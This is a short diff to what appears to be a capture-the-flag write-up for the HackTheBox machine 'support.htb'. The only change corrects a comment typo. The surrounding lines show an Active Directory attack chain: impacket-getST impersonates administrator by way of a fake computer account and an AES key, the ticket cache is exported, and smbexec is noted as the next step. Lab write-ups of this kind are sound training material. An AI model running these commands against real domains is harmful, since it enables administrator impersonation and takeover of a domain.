@@ -296,7 +296,7 @@ Get-ADComputer (Get-Variable -Name "targetComputer").Value -Properties Principal
 # Using getTGT from Impacket, generate a ccached TGT and used KERB5CCNAME pass the ccahe file for the requested service. 
 impacket-getST support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B
 
-# Set local variable of KERB5CCNAME to pass the ccahe TGT file for the requested service.
+# Set local variable of KERB5CCNAME to pass the ccache TGT file for the requested service.
 export KRB5CCNAME=administrator.ccache
 
 # Use smbexec.py to connect with the TGT we just made to the server as the user administrator 
